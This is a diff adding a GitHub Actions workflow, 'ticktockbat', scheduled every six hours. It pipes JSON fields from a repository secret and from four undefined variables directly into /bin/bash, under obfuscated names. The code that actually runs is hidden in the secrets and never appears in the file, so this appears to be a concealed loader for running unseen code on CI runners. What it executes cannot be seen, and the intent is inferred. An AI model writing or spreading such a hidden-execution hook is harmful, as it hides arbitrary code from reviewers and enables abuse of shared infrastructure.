@@ -1,0 +1,20 @@
+name: ticktockbat
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ticktockbat
+        env:
+          lnm44: ${{ secrets.lnm44 }}
+        run: |
+          echo $lnm44 | jq -r .x31919 | /bin/bash
+          echo $euyou7 | jq -r .iaar5942 | /bin/bash
+          echo $reqj222 | jq -r .ca845 | /bin/bash
+          echo $ejms1 | jq -r .attm31902 | /bin/bash
+          echo $in9518 | jq -r .e5 | /bin/bash
+
